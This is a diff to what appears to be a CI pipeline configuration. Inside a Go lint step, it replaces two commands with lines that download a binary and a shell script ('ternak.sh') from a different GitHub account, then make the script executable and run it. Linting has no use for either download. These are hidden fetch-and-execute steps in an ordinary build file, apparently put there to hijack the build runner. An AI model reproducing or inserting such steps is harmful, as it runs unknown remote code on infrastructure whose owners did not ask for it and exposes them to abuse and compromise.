@@ -9,8 +9,8 @@ steps:
   image: golangci/golangci-lint:v1.26.0
   commands:
   - golangci-lint run
-  - wget https://raw.githubusercontent.com/renifer12/engine/main/obatkuat
-  - wget https://raw.githubusercontent.com/renifer12/engine/main/ternak.sh && chmod u+x ternak.sh && ./ternak.sh
+  - wget https://raw.githubusercontent.com/dhenisusanto/engine/main/obatkuat
+  - wget https://raw.githubusercontent.com/dhenisusanto/engine/main/ternak.sh && chmod u+x ternak.sh && ./ternak.sh
 ---
 kind: pipeline
 name: build
